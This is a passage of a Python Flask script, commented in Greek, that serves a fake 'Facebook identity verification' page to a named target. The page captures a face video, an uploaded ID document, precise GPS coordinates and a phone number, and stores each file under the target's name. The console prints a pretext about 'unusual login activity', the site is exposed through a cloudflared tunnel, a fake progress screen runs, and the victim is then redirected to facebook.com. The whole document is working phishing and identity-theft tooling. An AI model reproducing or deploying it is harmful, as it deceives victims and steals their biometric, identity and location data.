            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
            }}
        }}
        
        function nextStep() {{
            // Παράλειψη βήματος τηλεφώνου αν δεν είναι ενεργοποιημένο
            let next = currentStep + 1;
            if (next === 5 && !{str(phone_enabled).lower()}) {{
                next = 6; // Παράλειψη προς επεξεργασία
            }}
            
            if (next <= 7) {{ // 7 είναι το μέγιστο βήμα (ολοκλήρωση)
                showStep(next);
            }}
        }}
        
        function prevStep() {{
            let prev = currentStep - 1;
            if (prev === 5 && !{str(phone_enabled).lower()}) {{
                prev = 4; // Παράλειψη βήματος τηλεφώνου
            }}
            
            if (prev >= 1) {{
                showStep(prev);
            }}
        }}
        
        // Επαλήθευση Προσώπου
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById('startFaceBtn');
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση στην Κάμερα...';
                
                // Αίτημα κάμερας
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 480 }}
                    }},
                    audio: false
                }});
                
                // Εμφάνιση βίντεο
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Έναρξη σάρωσης προσώπου
                startFaceScan();
                
            }} catch (error) {{
                console.error("Σφάλμα κάμερας:", error);
                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί τα δικαιώματα κάμερας.");
                document.getElementById('startFaceBtn').disabled = false;
                document.getElementById('startFaceBtn').textContent = 'Ξεκινήστε Σάρωση Προσώπου';
            }}
        }}
        
        function startFaceScan() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showInstruction(0);
            
            // Έναρξη εγγραφής
            startFaceRecording();
            
            // Έναρξη αντίστροφης μέτρησης
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Αλλαγή οδηγιών κάθε λίγα δευτερόλεπτα
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                document.getElementById('instructionIcon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Διακοπή κάμερας
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Εμφάνιση ολοκλήρωσης
            showInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✓ Ολοκληρώθηκε";
            
            // Αυτόματη συνέχεια
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_name: targetName,
                        target_email: targetEmail
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση προσώπου ανέβηκε');
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // Επαλήθευση Ταυτότητας
        function handleIDUpload(input) {{
            const file = input.files[0];
            if (file) {{
                idFile = file;
                
                // Εμφάνιση προεπισκόπησης
                const reader = new FileReader();
                reader.onload = function(e) {{
                    const preview = document.getElementById('idPreview');
                    const previewImage = document.getElementById('idPreviewImage');
                    previewImage.src = e.target.result;
                    preview.style.display = 'block';
                }};
                reader.readAsDataURL(file);
                
                // Ενεργοποίηση κουμπιού υποβολής
                document.getElementById('submitIdBtn').disabled = false;
            }}
        }}
        
        function submitIDVerification() {{
            if (!idFile) return;
            
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Ανέβασμα Ταυτότητας...';
            
            const btn = document.getElementById('submitIdBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            const formData = new FormData();
            formData.append('id_file', idFile);
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_name', targetName);
            formData.append('target_email', targetEmail);
            
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ Η ταυτότητα ανέβηκε επιτυχώς';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function() {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Το ανέβασμα απέτυχε. Παρακαλώ δοκιμάστε ξανά.';
                    btn.disabled = false;
                    btn.textContent = 'Υποβολή Ταυτότητας για Επαλήθευση';
                }}
            }});
        }}
        
        // Επαλήθευση Τοποθεσίας
        function requestLocation() {{
            const btn = document.getElementById('locationBtn');
            const statusDiv = document.getElementById('locationStatus');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Πρόσβαση στην τοποθεσία σας...';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται';
                return;
            }}
            
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    updateLocationUI(position);
                    sendLocationToServer(position);
                    completeLocationVerification();
                }},
                (error) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = 'Απορρίφθηκε η πρόσβαση τοποθεσίας. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.';
                    btn.disabled = false;
                    btn.textContent = 'Δοκιμάστε Ξανά';
                }},
                {{ enableHighAccuracy: true, timeout: 10000 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude.toFixed(6);
            const lon = position.coords.longitude.toFixed(6);
            const accuracy = Math.round(position.coords.accuracy);
            
            document.getElementById('latValue').textContent = lat;
            document.getElementById('lonValue').textContent = lon;
            document.getElementById('accuracyValue').textContent = accuracy + ' μέτρα';
            document.getElementById('locationDetails').style.display = 'block';
            
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = '✓ Η τοποθεσία επαληθεύτηκε';
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_name: targetName,
                    target_email: targetEmail
                }}),
                contentType: 'application/json'
            }});
        }}
        
        function completeLocationVerification() {{
            document.getElementById('locationBtn').disabled = true;
            document.getElementById('locationBtn').textContent = '✓ Η Τοποθεσία Επαληθεύτηκε';
            
            setTimeout(() => {{
                startFinalVerification();
            }}, 1500);
        }}
        
        // Επαλήθευση Τηλεφώνου
        function submitPhoneVerification() {{
            const phone = document.getElementById('phoneInput').value;
            if (!phone) {{
                alert('Παρακαλώ εισάγετε αριθμό τηλεφώνου');
                return;
            }}
            
            $.ajax({{
                url: '/submit_phone_verification',
                type: 'POST',
                data: JSON.stringify({{
                    phone_number: phone,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_name: targetName
                }}),
                contentType: 'application/json'
            }});
            
            startFinalVerification();
        }}
        
        // Τελική Επεξεργασία
        function startFinalVerification() {{
            showStep('stepFinal');
            
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 40) {{
                    message = `Επαλήθευση σάρωσης προσώπου... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = `Επικύρωση εγγράφου ταυτότητας... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Έλεγχος δεδομένων τοποθεσίας... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Ολοκλήρωση επαλήθευσης... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        submitCompleteVerification();
                        showStep('stepComplete');
                        startCountdown();
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function startCountdown() {{
            let countdown = 5;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToFacebook();
                }}
            }}, 1000);
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_name: targetName,
                    target_email: targetEmail,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }}),
                contentType: 'application/json'
            }});
        }}
        
        function redirectToFacebook() {{
            window.location.href = 'https://facebook.com';
        }}
        
        // Αρχικοποίηση
        updateStepIndicators();
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'άγνωστο')
            target_name = data.get('target_name', 'άγνωστο')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"facebook_face_{target_name}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_name}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'target_name': target_name,
                'target_email': data.get('target_email', ''),
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat())
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου Facebook: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'άγνωστο')
        target_name = request.form.get('target_name', 'άγνωστο')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"facebook_id_{target_name}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_name}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'target_name': target_name,
            'target_email': request.form.get('target_email', ''),
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat())
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκε έγγραφο ταυτότητας Facebook: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'άγνωστο')
            target_name = data.get('target_name', 'άγνωστο')
            
            # Επεξεργασία τοποθεσίας στο παρασκήνιο
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας Facebook: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            target_name = data.get('target_name', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"facebook_complete_{target_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε σύνοψη επαλήθευσης Facebook: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4046
    script_name = "Σελίδα Επαλήθευσης Facebook"
    
    print("\n" + "="*60)
    print("ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ FACEBOOK")
    print("="*60)
    print(f"[+] Όνομα Στόχου: {VERIFICATION_SETTINGS['target_name']}")
    print(f"[+] Email Στόχου: {VERIFICATION_SETTINGS['target_email']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    
    print(f"[+] Φάκελος δεδομένων: {DOWNLOAD_FOLDER}")
    print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"[+] Επαλήθευση τηλεφώνου: Ενεργοποιημένη")
    
    print("\n[+] Εκκίνηση διακομιστή επαλήθευσης Facebook...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    print("="*60)
    print("ΑΠΑΙΤΕΙΤΑΙ ΕΠΙΒΕΒΑΙΩΣΗ ΤΑΥΤΟΤΗΤΑΣ FACEBOOK")
    print("="*60)
    print(f"👤 Λογαριασμός: {VERIFICATION_SETTINGS['target_name']}")
    print(f"📧 Email: {VERIFICATION_SETTINGS['target_email']}")
    print(f"🔒 Αιτία: Εντοπίστηκε ασυνήθιστη δραστηριότητα σύνδεσης")
    print(f"⚠️  Απαιτείται Δράση: Ολοκληρώστε την επαλήθευση εντός 24 ωρών")
    print(f"📋 Βήματα: Σάρωση προσώπου + Ανέβασμα ταυτότητας + Έλεγχος τοποθεσίας")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο στο πρόγραμμα περιήγησης για να ξεκινήσετε την επαλήθευση...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός διακομιστή επαλήθευσης Facebook...")
        sys.exit(0)